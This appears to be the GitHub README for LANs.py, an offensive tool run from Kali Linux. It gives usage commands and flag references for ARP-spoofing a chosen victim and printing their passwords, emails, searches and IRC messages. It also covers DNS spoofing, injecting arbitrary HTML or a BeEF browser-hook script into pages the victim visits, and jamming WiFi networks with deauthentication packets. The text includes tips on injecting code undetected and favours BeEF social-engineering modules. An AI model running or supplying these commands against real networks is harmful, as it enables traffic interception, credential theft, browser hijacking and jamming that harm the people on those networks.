If you have any issues running this script I'd suggest checking out [MITMf](https://github.com/byt3bl33d3r/MITMf) which does all the same things + more. Eventually this script needs to be rewritten with net-creds as the engine.

# LANs.py

* Automatically find the most active WLAN users then spy on one of them and/or inject arbitrary HTML/JS into pages they visit. 
    * Individually poisons the ARP tables of the target box, the router and the DNS server if necessary. Does not poison anyone else on the network. Displays all most the interesting bits of their traffic and can inject custom html into pages they visit. Cleans up after itself.

* Also can be used to continuously jam nearby WiFi networks. This has an approximate range of a 1 block radius, but this can vary based off of the strength of your WiFi card. This can be fine-tuned to allow jamming of everyone or even just one client. Cannot jam WiFi and spy simultaneously.


### Prerequisites:
- Linux<br />
- `python-scapy`<br />
- `python-nfqueue` (nfqueue-bindings 0.4-3)<br />
- `aircrack-ng`<br />
- `python-twisted`<br />
- `nmap`<br />
- `nbtscan`<br />
- `tcpdump`<br />
- a wireless card capable of promiscuous mode if you don't know the target's IP address<br />
- [optional] `BeEf`<br />

Tested on Kali Linux. In the following examples, 192.168.0.5 will be the attacking machine and 192.168.0.10 will be the victim.

All options:

```shell
Python LANs.py  [-h] [-b BEEF] [-c CODE] [-u] [-ip IPADDRESS] [-vmac VICTIMMAC]
                [-d] [-v] [-dns DNSSPOOF] [-a] [-set] [-p] [-na] [-n]
                [-i INTERFACE] [-r REDIRECTTO] [-rip ROUTERIP]
                [-rmac ROUTERMAC] [-pcap PCAP] [-s SKIP] [-ch CHANNEL]
                [-m MAXIMUM] [-no] [-t TIMEINTERVAL] [--packets PACKETS]
                [--directedonly] [--accesspoint ACCESSPOINT]
```

### Usage


#### Common usage:
```shell
python LANs.py -u -p
```
Active target identification which ARP spoofs the chosen target and outputs all the interesting non-HTTPS data they send or request. There's no `-ip` option so this will ARP scan the network, compare it to a live running promiscuous capture, and list all the clients on the network. Attempts to tag the targets with a Windows netbios name and prints how many data packets they are sending/receiving. The ability to capture data packets they send is very dependent on physical proximity and the power of your network card. Ctrl-C when you're ready and pick your target which it will then ARP spoof.

---

Supports interception and harvesting of data from the following protocols: HTTP, FTP, IMAP, POP3, IRC. Will print the first 135 characters of URLs visited and ignore URLs ending in .jpg, .jpeg, .gif, .css, .ico, .js, .svg, and .woff. Will also print all protocol username/passwords entered, searches made on any site, emails sent/received, and IRC messages sent/received. [Screenshot](http://i.imgur.com/kQofTYP.png) 

Running `LANs.py` without argument will give you the list of active targets and upon selecting one, it will act as a simple ARP spoofer.

#### Other common usage:
```shell
python LANs.py -u -p -d -ip 192.168.0.10
```

`-d`: open an xterm with driftnet to see all images they view<br />
`-ip`: target this IP address and skip the active targeting at the beginning


#### HTML injection:
```shell
python LANs.py -b http://192.168.0.5:3000/hook.js
```

Inject a BeEF hook URL (http://beefproject.com/, [tutorial](http://resources.infosecinstitute.com/beef-part-1/)) into pages the victim visits. This just wraps the argument in `<script>` tags so you can really enter any location of a javascript file. Attempts to insert it after the first </head> tag found in the page's HTML.


```shell
python LANs.py -c '<title>Owned.</title>'
```

Inject arbitrary HTML into pages the victim visits. First tries to inject it after the first `<head>` tag and failing that, injects prior to the first `</head>` tag. This example will change the page title to 'Owned.'


#### Read from pcap:
```shell
python LANs.py -pcap libpcapfilename -ip 192.168.0.10
```

To read from a pcap file you must include the target's IP address with the -ip option. It must also be in libpcap form which is the most common anyway. One advantage of reading from a pcap file is that you do not need to be root to execute the script.

#### DNS spoofing
```shell
python LANs.py -a -r 80.87.128.67
```

```shell
python LANs.py -dns eff.org
```
Example 1: The `-a` flag will spoof every single DNS request the victim makes and when used in conjunction with `-r`, it will redirect them to `-r`'s argument address. The victim will be redirected to stallman.org (80.87.128.67) no matter what they type in the address bar.  
Example 2: This will spoof the domain eff.org and subdomains of eff.org. When there is no `-r` flag present with the `-a` or `-dns` flags, the script will default to sending the victim to the attacker's IP address. If the victim tries to go to eff.org they will be redirected to the attacker's IP.

#### Aggressive usage:

```shell
python LANs.py -v -d -p -n -na -set -a -r 80.87.128.67 -c '<title>Owned.</title>' -b http://192.168.0.5:3000/hook.js -ip 192.168.0.10
```


#### Jam all WiFi networks:

```shell
python LANs.py --jam
```


#### Jam just one access point (router)
```shell
python Lans.py --jam --accesspoint 01:MA:C0:AD:DY
```

### All options

#### Normal Usage:

  * `-b BEEF_HOOK_URL`: Copy the BeEF hook URL to inject it into every page the victim visits, eg: `-b http://192.168.1.10:3000/hook.js`
  * `-c 'HTML CODE'`: Inject arbitrary HTML code into pages the victim visits; include the quotes when selecting HTML to inject
  * `-d`: Open an xterm with driftnet to see all images they view
  * `-dns DOMAIN`: Spoof the DNS of DOMAIN. e.g. `-dns facebook.com` will DNS spoof every DNS request to facebook.com or subdomain.facebook.com
  * `-a`: Spoof every DNS response the victim makes, effectively creating a captive portal page; `-r` can be used with this
  * `-r IPADDRESS`: Only to be used with `-dns DOMAIN`; redirect the user to this `IPADDRESS` when they visit `DOMAIN`
  * `-u`: Print URLs visited; truncate at 150 characters and filter image/css/js/woff/svg urls
  * `-i INTERFACE`: Specify interface; default is the first interface in `ip route`, eg: `-i wlan0`
  * `-ip IPADDRESS`: Target this IP address
  * `-n`: Perform a quick nmap scan on the target
  * `-na`: Perform an aggressive nmap scan in the background and output to [victim IP address].nmap.txt
  * `-p`: Print username/passwords for FTP/IMAP/POP/IRC/HTTP, HTTP POSTs made, all searches made, incoming/outgoing emails, and IRC messages sent/received
  * `-pcap PCAP_FILE`: Parse through all the packets in a pcap file; requires the `-ip IPADDRESS` flag
  * `-rmac ROUTER_MAC`: Enter router MAC here if you're having trouble getting the script to automatically fetch it
  * `-rip ROUTER_IP`: Enter router IP here if you're having trouble getting the script to automatically fetch it
  * `-v`: Show verbose URLs which do not truncate at 150 characters like `-u`
  * `--jam`: Jam all or some 2.4GHz wireless access points and clients in range; use arguments below in conjunction with this argument if necessary

#### WiFi jamming:

  * `-s MAC_ADDRESS_TO_SKIP`: Specify a MAC address to skip deauthing. Example: `-s 00:11:BB:33:44:AA`
  * `-ch CHANNEL`: Limit wifijammer to single channel
  * `-m MAXIMUM`: Maximum number of clients to deauth. Use if moving around so as to prevent deauthing client/AP pairs outside of current range. 
  * `-no`: Do not clear the deauth list when the maximum number of client/AP combos is reached. Must be used in conjunction with `-m`. Example: `-m 10 -n`
  * `-t TIME_INTERVAL`: Time between each deauth packet. Default is maximum. If you see scapy errors like 'no buffer space' try: `-t .00001`
  * `--packets NUMBER`: Number of packets to send in each deauth burst. Default is 1 packet. 
  * `--directedonly`: Don't send deauth packets to the broadcast address of APs and only send to client/AP pairs
  * `--accesspoint ROUTER_MAC`: Enter the MAC address of a specific AP to target. 

### Cleaning up

Upon receiving a Ctrl-C:

- Turns off IP forwarding<br />
- Flushes iptables firewall<br />
- Individually restores the router and victim's ARP tables<br />


### Technical details
This script uses a python `nfqueue-bindings` queue wrapped in a `Twisted IReadDescriptor` to feed packets to callback functions. `nfqueue-bindings` is used to drop and forward certain packets. Python's `scapy` library does the work to parse and inject packets.

Injecting code undetected is a dicey game, if a minor thing goes wrong or the server the victim is requesting data from performs things in a unique or rare way then the user won't be able to open the page they're trying to view and they'll know something's up. This script is designed to forward packets if anything fails. During usage, you may see lots of "[!] Injected packet for www.domain.com" but only see one or two domains on the BeEf panel that the browser is hooked to. This is OK. If the victim doesn't get hooked on the first page, just wait for them to visit a few other pages. My favorite `BeEf` tools are in Commands > Social Engineering.

***
* [danmcinerney.org](danmcinerney.org)
* [![Analytics](https://ga-beacon.appspot.com/UA-46613304-2/LANs.py/README.md)](https://github.com/igrigorik/ga-beacon)
